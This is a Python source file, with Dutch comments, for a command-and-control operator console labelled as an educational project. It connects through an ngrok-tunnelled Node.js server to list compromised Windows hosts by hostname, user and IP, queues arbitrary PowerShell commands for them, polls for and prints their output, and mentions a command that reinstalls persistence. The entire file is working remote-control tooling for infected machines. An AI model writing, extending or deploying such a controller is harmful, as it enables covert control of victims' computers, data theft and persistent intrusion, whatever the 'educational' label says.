#!/usr/bin/env python3
"""
Kali Linux C2 Controller - Node.js Server Edition
Educational Cybersecurity Project
"""

import requests
import json
import time
import sys
from datetime import datetime
from typing import List, Dict, Optional

# Configuratie - VERANDER DEZE
SERVER_URL = "https://your-ngrok-url.ngrok-free.app"  # Of localhost:3000 voor lokaal
ADMIN_TOKEN = "your-secret-token-change-this"

class Colors:
    """Terminal kleuren"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class C2Controller:
    def __init__(self, server_url: str, token: str):
        self.server_url = server_url.rstrip('/')
        self.headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)
    
    def test_connection(self) -> bool:
        """Test verbinding met server"""
        try:
            response = self.session.get(f"{self.server_url}/health", timeout=5)
            return response.status_code == 200
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Kan niet verbinden met server: {e}{Colors.END}")
            return False
    
    def list_clients(self) -> List[Dict]:
        """Lijst alle actieve clients"""
        try:
            response = self.session.get(
                f"{self.server_url}/admin/clients",
                timeout=10
            )
            response.raise_for_status()
            data = response.json()
            return data.get('clients', [])
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 401:
                print(f"{Colors.RED}[ERROR] Authenticatie mislukt - check je ADMIN_TOKEN{Colors.END}")
            else:
                print(f"{Colors.RED}[ERROR] HTTP {e.response.status_code}: {e}{Colors.END}")
            return []
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Kan clients niet ophalen: {e}{Colors.END}")
            return []
    
    def send_command(self, client_id: str, command: str) -> Optional[Dict]:
        """Stuur command naar specifieke client"""
        try:
            payload = {
                'clientId': client_id,
                'command': command
            }
            response = self.session.post(
                f"{self.server_url}/admin/command",
                json=payload,
                timeout=10
            )
            response.raise_for_status()
            return response.json()
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Kan command niet versturen: {e}{Colors.END}")
            return None
    
    def get_output(self, client_id: str) -> Optional[Dict]:
        """Haal output op van client"""
        try:
            response = self.session.get(
                f"{self.server_url}/admin/output?id={client_id}",
                timeout=10
            )
            response.raise_for_status()
            return response.json()
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Kan output niet ophalen: {e}{Colors.END}")
            return None
    
    def clear_output(self, client_id: str) -> bool:
        """Clear output van client"""
        try:
            response = self.session.delete(
                f"{self.server_url}/admin/output/{client_id}",
                timeout=10
            )
            response.raise_for_status()
            return True
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Kan output niet wissen: {e}{Colors.END}")
            return False
    
    def get_stats(self) -> Optional[Dict]:
        """Haal server statistieken op"""
        try:
            response = self.session.get(
                f"{self.server_url}/admin/stats",
                timeout=10
            )
            response.raise_for_status()
            return response.json()
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Kan stats niet ophalen: {e}{Colors.END}")
            return None
    
    def display_clients(self, clients: List[Dict]):
        """Toon lijst van clients"""
        if not clients:
            print(f"\n{Colors.YELLOW}[*] Geen actieve clients{Colors.END}")
            return
        
        print(f"\n{Colors.CYAN}{'='*80}")
        print(f"{Colors.BOLD}ACTIEVE CLIENTS{Colors.END}")
        print(f"{Colors.CYAN}{'='*80}{Colors.END}")
        
        for idx, client in enumerate(clients, 1):
            hostname = client.get('hostname', 'Unknown')
            username = client.get('username', 'Unknown')
            ip = client.get('ip', 'Unknown')
            last_seen = client.get('lastSeen', 0)
            
            # Bereken tijdsverschil
            if last_seen:
                time_diff = int(time.time() * 1000) - last_seen
                seconds_ago = time_diff // 1000
                
                if seconds_ago < 60:
                    time_str = f"{seconds_ago}s geleden"
                elif seconds_ago < 3600:
                    time_str = f"{seconds_ago // 60}m geleden"
                else:
                    time_str = f"{seconds_ago // 3600}h geleden"
            else:
                time_str = "Onbekend"
            
            # Kleur op basis van recency
            if last_seen and (int(time.time() * 1000) - last_seen) < 30000:
                status_color = Colors.GREEN
                status = "ACTIVE"
            else:
                status_color = Colors.YELLOW
                status = "IDLE"
            
            print(f"\n{Colors.BOLD}[{idx}] {hostname}{Colors.END} {status_color}[{status}]{Colors.END}")
            print(f"    User: {Colors.CYAN}{username}{Colors.END}")
            print(f"    IP: {Colors.CYAN}{ip}{Colors.END}")
            print(f"    Last Seen: {Colors.CYAN}{time_str}{Colors.END}")
            
            # Toon extra data indien beschikbaar
            data = client.get('data', {})
            if isinstance(data, dict):
                if data.get('type') == 'init':
                    print(f"    Status: {Colors.GREEN}{data.get('message', 'Connected')}{Colors.END}")
                elif data.get('type') == 'output':
                    cmd = data.get('command', 'N/A')
                    if len(cmd) > 50:
                        cmd = cmd[:47] + "..."
                    print(f"    Last Command: {Colors.YELLOW}{cmd}{Colors.END}")
        
        print(f"\n{Colors.CYAN}{'='*80}{Colors.END}\n")
    
    def interactive_shell(self, client_id: str):
        """Interactieve shell voor specifieke client"""
        print(f"\n{Colors.GREEN}[*] Verbonden met {client_id}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Type 'help' voor beschikbare commands{Colors.END}")
        print(f"{Colors.YELLOW}[*] Type 'exit' om terug te keren naar menu{Colors.END}")
        print(f"{Colors.YELLOW}[*] Commands worden asynchroon uitgevoerd (5s polling){Colors.END}\n")
        
        # Built-in commands
        builtin_commands = {
            'help': 'Toon deze help',
            'exit': 'Terug naar hoofdmenu',
            'clear': 'Clear output history',
            'sysinfo': 'Toon systeem informatie',
            'persist': 'Herinstalleer persistence'
        }
        
        while True:
            try:
                command = input(f"{Colors.CYAN}{client_id}>{Colors.END} ").strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    break
                
                if command.lower() == 'help':
                    print(f"\n{Colors.BOLD}Built-in Commands:{Colors.END}")
                    for cmd, desc in builtin_commands.items():
                        print(f"  {Colors.GREEN}{cmd:<15}{Colors.END} - {desc}")
                    print(f"\n{Colors.BOLD}PowerShell Commands:{Colors.END}")
                    print(f"  Voer elke PowerShell command in (bijv: Get-Process, ls, whoami)")
                    print()
                    continue
                
                if command.lower() == 'clear':
                    if self.clear_output(client_id):
                        print(f"{Colors.GREEN}[+] Output history gewist{Colors.END}\n")
                    continue
                
                # Stuur command
                result = self.send_command(client_id, command)
                if result:
                    print(f"{Colors.GREEN}[+] Command in queue: {command}{Colors.END}")
                    print(f"{Colors.YELLOW}[*] Wacht op output (max 30s)...{Colors.END}")
                    
                    # Poll voor output
                    output_received = False
                    for i in range(6):  # 6 x 5 seconden = 30 seconden
                        time.sleep(5)
                        data = self.get_output(client_id)
                        
                        if data and data.get('outputs'):
                            outputs = data['outputs']
                            
                            # Zoek naar meest recente output voor dit command
                            for output in reversed(outputs):
                                if output.get('command') == command:
                                    print(f"\n{Colors.CYAN}--- OUTPUT ---{Colors.END}")
                                    
                                    if output.get('type') == 'output':
                                        result_text = output.get('result', 'Geen output')
                                        print(result_text)
                                    elif output.get('type') == 'error':
                                        print(f"{Colors.RED}ERROR: {output.get('error', 'Unknown error')}{Colors.END}")
                                    
                                    print(f"{Colors.CYAN}--- END ---{Colors.END}\n")
                                    output_received = True
                                    break
                            
                            if output_received:
                                break
                        
                        # Toon progress
                        dots = "." * (i + 1)
                        print(f"{Colors.YELLOW}[*] Polling{dots}{Colors.END}", end='\r')
                    
                    if not output_received:
                        print(f"\n{Colors.RED}[!] Timeout - geen response ontvangen{Colors.END}\n")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[*] Onderbroken door gebruiker{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {e}{Colors.END}")
    
    def show_stats(self):
        """Toon server statistieken"""
        stats = self.get_stats()
        if stats:
            print(f"\n{Colors.CYAN}{'='*50}")
            print(f"{Colors.BOLD}SERVER STATISTIEKEN{Colors.END}")
            print(f"{Colors.CYAN}{'='*50}{Colors.END}\n")
            
            print(f"Total Clients: {Colors.GREEN}{stats.get('totalClients', 0)}{Colors.END}")
            print(f"Active Commands: {Colors.YELLOW}{stats.get('activeCommands', 0)}{Colors.END}")
            print(f"Total Outputs: {Colors.CYAN}{stats.get('totalOutputs', 0)}{Colors.END}")
            
            uptime = stats.get('uptime', 0)
            hours = int(uptime // 3600)
            minutes = int((uptime % 3600) // 60)
            print(f"Server Uptime: {Colors.GREEN}{hours}h {minutes}m{Colors.END}")
            
            memory = stats.get('memory', {})
            rss_mb = memory.get('rss', 0) / 1024 / 1024
            print(f"Memory Usage: {Colors.CYAN}{rss_mb:.2f} MB{Colors.END}")
            
            print(f"\n{Colors.CYAN}{'='*50}{Colors.END}\n")
    
    def main_menu(self):
        """Hoofd menu"""
        print(f"""
{Colors.CYAN}╔═══════════════════════════════════════════╗
║  KALI C2 CONTROLLER - NODE.JS EDITION    ║
║          EDUCATIONAL PURPOSE              ║
╚═══════════════════════════════════════════╝{Colors.END}
        """)
        
        # Test verbinding
        print(f"{Colors.YELLOW}[*] Testing server connection...{Colors.END}")
        if not self.test_connection():
            print(f"{Colors.RED}[!] Kan geen verbinding maken met server{Colors.END}")
            print(f"{Colors.YELLOW}[*] Check of de server draait en de URL correct is{Colors.END}")
            return
        
        print(f"{Colors.GREEN}[+] Verbonden met server: {self.server_url}{Colors.END}\n")
        
        while True:
            print(f"\n{Colors.BOLD}MENU:{Colors.END}")
            print(f"{Colors.CYAN}[1]{Colors.END} Lijst actieve clients")
            print(f"{Colors.CYAN}[2]{Colors.END} Verbind met client (interactieve shell)")
            print(f"{Colors.CYAN}[3]{Colors.END} Stuur single command")
            print(f"{Colors.CYAN}[4]{Colors.END} Server statistieken")
            print(f"{Colors.CYAN}[5]{Colors.END} Refresh")
            print(f"{Colors.CYAN}[0]{Colors.END} Exit")
            
            choice = input(f"\n{Colors.GREEN}Keuze>{Colors.END} ").strip()
            
            if choice == '1':
                clients = self.list_clients()
                self.display_clients(clients)
            
            elif choice == '2':
                clients = self.list_clients()
                if not clients:
                    print(f"{Colors.YELLOW}[!] Geen actieve clients{Colors.END}")
                    continue
                
                self.display_clients(clients)
                client_idx = input(f"\n{Colors.GREEN}Selecteer client nummer>{Colors.END} ").strip()
                
                try:
                    idx = int(client_idx) - 1
                    if 0 <= idx < len(clients):
                        client_id = clients[idx].get('hostname')
                        self.interactive_shell(client_id)
                    else:
                        print(f"{Colors.RED}[!] Ongeldige client nummer{Colors.END}")
                except ValueError:
                    print(f"{Colors.RED}[!] Voer een geldig nummer in{Colors.END}")
            
            elif choice == '3':
                clients = self.list_clients()
                if not clients:
                    print(f"{Colors.YELLOW}[!] Geen actieve clients{Colors.END}")
                    continue
                
                self.display_clients(clients)
                client_idx = input(f"\n{Colors.GREEN}Selecteer client nummer>{Colors.END} ").strip()
                command = input(f"{Colors.GREEN}Command>{Colors.END} ").strip()
                
                try:
                    idx = int(client_idx) - 1
                    if 0 <= idx < len(clients):
                        client_id = clients[idx].get('hostname')
                        result = self.send_command(client_id, command)
                        if result:
                            print(f"{Colors.GREEN}[+] Command verstuurd naar {client_id}{Colors.END}")
                    else:
                        print(f"{Colors.RED}[!] Ongeldige client nummer{Colors.END}")
                except ValueError:
                    print(f"{Colors.RED}[!] Voer een geldig nummer in{Colors.END}")
            
            elif choice == '4':
                self.show_stats()
            
            elif choice == '5':
                print(f"{Colors.YELLOW}[*] Refreshing...{Colors.END}")
                time.sleep(1)
            
            elif choice == '0':
                print(f"{Colors.GREEN}[*] Afsluiten...{Colors.END}")
                break
            
            else:
                print(f"{Colors.RED}[!] Ongeldige keuze{Colors.END}")

if __name__ == "__main__":
    print(f"{Colors.BOLD}C2 Controller v1.0{Colors.END}\n")
    
    # Check configuratie
    if SERVER_URL == "https://your-ngrok-url.ngrok-free.app":
        print(f"{Colors.RED}[!] WAARSCHUWING: SERVER_URL niet geconfigureerd!{Colors.END}")
        print(f"{Colors.YELLOW}[*] Edit het script en verander SERVER_URL{Colors.END}\n")
    
    if ADMIN_TOKEN == "your-secret-token-change-this":
        print(f"{Colors.RED}[!] WAARSCHUWING: ADMIN_TOKEN niet veranderd!{Colors.END}")
        print(f"{Colors.YELLOW}[*] Dit is niet veilig voor productie gebruik{Colors.END}\n")
    
    # Initialiseer controller
    controller = C2Controller(SERVER_URL, ADMIN_TOKEN)
    
    try:
        controller.main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.GREEN}[*] Programma gestopt{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[FATAL ERROR] {e}{Colors.END}")
        import traceback
        traceback.print_exc()
